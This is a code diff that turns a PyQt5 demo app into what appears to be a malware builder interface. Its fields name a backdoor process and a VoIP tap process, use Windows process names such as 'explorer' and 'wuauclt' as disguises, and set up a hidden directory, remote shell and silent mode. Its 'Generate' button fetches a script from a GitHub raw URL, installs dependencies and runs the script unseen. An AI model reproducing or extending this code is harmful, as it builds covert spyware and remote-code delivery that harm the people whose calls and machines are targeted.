@@ -1,142 +1,176 @@
 import sys
-from PyQt5.QtCore import Qt
-from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QTabWidget, QLabel, QMainWindow, QHBoxLayout, QPushButton, QCheckBox, QSlider, QSpinBox
+import os
+import subprocess
+import urllib.request
+from PyQt5.QtWidgets import (
+    QApplication, QWidget, QVBoxLayout, QTabWidget, QLabel, QMainWindow, 
+    QHBoxLayout, QPushButton, QCheckBox, QLineEdit, QRadioButton, QGroupBox, 
+    QComboBox, QSpinBox, QTextEdit
+)
+
+# GitHub RAW URL (Change this to your script URL)
+GITHUB_SCRIPT_URL = "https://raw.githubusercontent.com/DonateToStream/Test09283/refs/heads/main/gibbity.py"
 
 class MainApp(QMainWindow):
     def __init__(self):
         super().__init__()
         self.setWindowTitle('Main App with 3 Tabs')
         self.setGeometry(100, 100, 800, 600)
-        
-        self.dark_mode = False  # Track the dark mode status
-
         self.init_ui()
 
     def init_ui(self):
-        # Create the main widget and layout
         main_widget = QWidget(self)
         main_layout = QHBoxLayout(main_widget)
 
-        # Create a Tab Widget for the tabs
         self.tabs = QTabWidget()
-        self.tabs.addTab(self.create_tab("Tab 1"), "Tab 1")
+        self.tabs.addTab(self.create_tab1(), "Tab 1")
         self.tabs.addTab(self.create_tab("Tab 2"), "Tab 2")
         self.tabs.addTab(self.create_tab("Tab 3"), "Tab 3")
-        self.tabs.addTab(self.create_settings_tab(), "Settings")
 
-        # Add the tab widget to the layout
         main_layout.addWidget(self.tabs)
-
-        # Set the central widget
         self.setCentralWidget(main_widget)
 
-    def create_tab(self, tab_name):
-        # Create a QWidget for each tab
+    def create_tab1(self):
         tab = QWidget()
         layout = QVBoxLayout()
 
-        # Label for the tab
-        label = QLabel(f'Welcome to {tab_name}', self)
-        layout.addWidget(label)
+        layout.addWidget(QLabel("LIID:"))
+        self.liid_input = QLineEdit()
+        layout.addWidget(self.liid_input)
 
-        # Button for each tab
-        button = QPushButton(f'Click me in {tab_name}', self)
-        button.clicked.connect(lambda: self.on_button_click(tab_name))
-        layout.addWidget(button)
+        layout.addWidget(QLabel("Middleware:"))
+        self.middleware_input = QLineEdit()
+        layout.addWidget(self.middleware_input)
 
-        # Additional buttons for more interactivity
-        extra_button = QPushButton(f'Extra Action in {tab_name}', self)
-        extra_button.clicked.connect(lambda: self.on_extra_button_click(tab_name))
-        layout.addWidget(extra_button)
+        layout.addWidget(QLabel("Receiver:"))
+        self.receiver_input = QLineEdit()
+        layout.addWidget(self.receiver_input)
 
+        layout.addWidget(QLabel("Entertainer:"))
+        self.entertainer_input = QLineEdit()
+        layout.addWidget(self.entertainer_input)
+
+        layout.addWidget(QLabel("Ring Buffer (MB):"))
+        self.ring_buffer_input = QSpinBox()
+        self.ring_buffer_input.setRange(1, 10000)
+        self.ring_buffer_input.setValue(1000)
+        layout.addWidget(self.ring_buffer_input)
+
+        layout.addWidget(QLabel("File Type:"))
+        self.file_type_combo = QComboBox()
+        self.file_type_combo.addItems(["Option 1", "Option 2", "Option 3"])
+        layout.addWidget(self.file_type_combo)
+
+        process_layout = QVBoxLayout()
+        process_layout.addWidget(QLabel("Backdoor Process Name:"))
+        self.backdoor_input = QLineEdit("explorer")
+        process_layout.addWidget(self.backdoor_input)
+
+        process_layout.addWidget(QLabel("VoIP Tap Process Name:"))
+        self.voip_input = QLineEdit("wuauclt")
+        process_layout.addWidget(self.voip_input)
+
+        process_layout.addWidget(QLabel("Hidden Directory Name:"))
+        self.hidden_dir_input = QLineEdit("Applications\\Explorer")
+        process_layout.addWidget(self.hidden_dir_input)
+
+        right_group = QGroupBox("Process Configuration")
+        right_group.setLayout(process_layout)
+        layout.addWidget(right_group)
+
+        def create_radio_group(title, options):
+            group = QGroupBox(title)
+            group_layout = QHBoxLayout()
+            for option in options:
+                radio = QRadioButton(option)
+                group_layout.addWidget(radio)
+            group.setLayout(group_layout)
+            return group
+
+        layout.addWidget(create_radio_group("Enable/Disable Entertainer", ["On", "Off"]))
+        layout.addWidget(create_radio_group("Sound Quality", ["High", "Low"]))
+        layout.addWidget(create_radio_group("Remote Shell", ["On", "Off"]))
+        layout.addWidget(create_radio_group("Silent Mode", ["On", "Off"]))
+
+        button_layout = QHBoxLayout()
+        self.generate_btn = QPushButton("Generate")
+        self.generate_btn.clicked.connect(self.open_download_panel)
+
+        reset_btn = QPushButton("Reset")
+        exit_btn = QPushButton("Exit")
+
+        button_layout.addWidget(self.generate_btn)
+        button_layout.addWidget(reset_btn)
+        button_layout.addWidget(exit_btn)
+
+        layout.addLayout(button_layout)
         tab.setLayout(layout)
         return tab
 
-    def on_button_click(self, tab_name):
-        # Function to be called when the primary button in the tab is clicked
-        print(f'Primary button clicked in {tab_name}')
+    def create_tab(self, tab_name):
+        tab = QWidget()
+        layout = QVBoxLayout()
+        layout.addWidget(QLabel(f'Welcome to {tab_name}'))
+        tab.setLayout(layout)
+        return tab
 
-    def on_extra_button_click(self, tab_name):
-        # Function to be called when the extra button in the tab is clicked
-        print(f'Extra button clicked in {tab_name}')
+    def open_download_panel(self):
+        self.download_window = DownloadWindow()
+        self.download_window.show()
 
-    def create_settings_tab(self):
-        # Create the Settings tab
-        settings_tab = QWidget()
-        settings_layout = QVBoxLayout()
 
-        # Dark mode toggle
-        self.dark_mode_checkbox = QCheckBox("Enable Dark Mode", self)
-        self.dark_mode_checkbox.stateChanged.connect(self.toggle_dark_mode)
-        settings_layout.addWidget(self.dark_mode_checkbox)
+class DownloadWindow(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Downloading Script...")
+        self.setGeometry(200, 200, 500, 300)
 
-        # Window size slider
-        size_label = QLabel("Adjust Window Size (Width):", self)
-        self.size_slider = QSlider(Qt.Horizontal, self)
-        self.size_slider.setMinimum(400)
-        self.size_slider.setMaximum(1200)
-        self.size_slider.setValue(self.width())
-        self.size_slider.valueChanged.connect(self.adjust_window_size)
-        settings_layout.addWidget(size_label)
-        settings_layout.addWidget(self.size_slider)
+        layout = QVBoxLayout()
+        self.status_label = QLabel("Downloading script...")
+        self.log_output = QTextEdit()
+        self.log_output.setReadOnly(True)
 
-        # Window position spinner (set top margin or something)
-        position_label = QLabel("Set Window Top Margin:", self)
-        self.position_spinner = QSpinBox(self)
-        self.position_spinner.setRange(0, 200)
-        self.position_spinner.setValue(self.y())
-        self.position_spinner.valueChanged.connect(self.adjust_window_position)
-        settings_layout.addWidget(position_label)
-        settings_layout.addWidget(self.position_spinner)
+        layout.addWidget(self.status_label)
+        layout.addWidget(self.log_output)
 
-        settings_tab.setLayout(settings_layout)
-        return settings_tab
+        self.setLayout(layout)
 
-    def toggle_dark_mode(self):
-        # Toggle dark mode
-        self.dark_mode = not self.dark_mode
-        self.update_theme()
+        # Start the download process
+        self.download_script()
 
-    def update_theme(self):
-        # Update the theme based on dark mode status
-        if self.dark_mode:
-            self.setStyleSheet("""
-                QWidget {
-                    background-color: #2e2e2e;
-                    color: white;
-                }
-                QPushButton {
-                    background-color: #444;
-                    color: white;
-                }
-                QLabel {
-                    color: white;
-                }
-            """)
-        else:
-            self.setStyleSheet("""
-                QWidget {
-                    background-color: white;
-                    color: black;
-                }
-                QPushButton {
-                    background-color: #f0f0f0;
-                    color: black;
-                }
-                QLabel {
-                    color: black;
-                }
-            """)
+    def download_script(self):
+        script_path = os.path.join(os.getcwd(), "downloaded_script.py")
 
-    def adjust_window_size(self):
-        # Adjust the window width based on the slider value
-        new_width = self.size_slider.value()
-        self.resize(new_width, self.height())
+        try:
+            urllib.request.urlretrieve(GITHUB_SCRIPT_URL, script_path)
+            self.log_output.append("Script downloaded successfully.")
+            self.status_label.setText("Installing dependencies...")
 
-    def adjust_window_position(self):
-        # Adjust the window top position based on the spin box value
-        new_top = self.position_spinner.value()
-        self.move(self.x(), new_top)
+            self.install_dependencies(script_path)
+        except Exception as e:
+            self.log_output.append(f"Download failed: {str(e)}")
+            self.status_label.setText("Download failed.")
+
+    def install_dependencies(self, script_path):
+        try:
+            subprocess.run(["pip", "install", "-r", "requirements.txt"], check=True)
+            self.log_output.append("Dependencies installed successfully.")
+            self.status_label.setText("Running script...")
+
+            self.run_script(script_path)
+        except subprocess.CalledProcessError as e:
+            self.log_output.append(f"Failed to install dependencies: {str(e)}")
+            self.status_label.setText("Dependency installation failed.")
+
+    def run_script(self, script_path):
+        try:
+            subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
+            self.log_output.append("Script is now running.")
+            self.status_label.setText("Script running successfully.")
+        except Exception as e:
+            self.log_output.append(f"Failed to run script: {str(e)}")
+            self.status_label.setText("Script execution failed.")
+
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
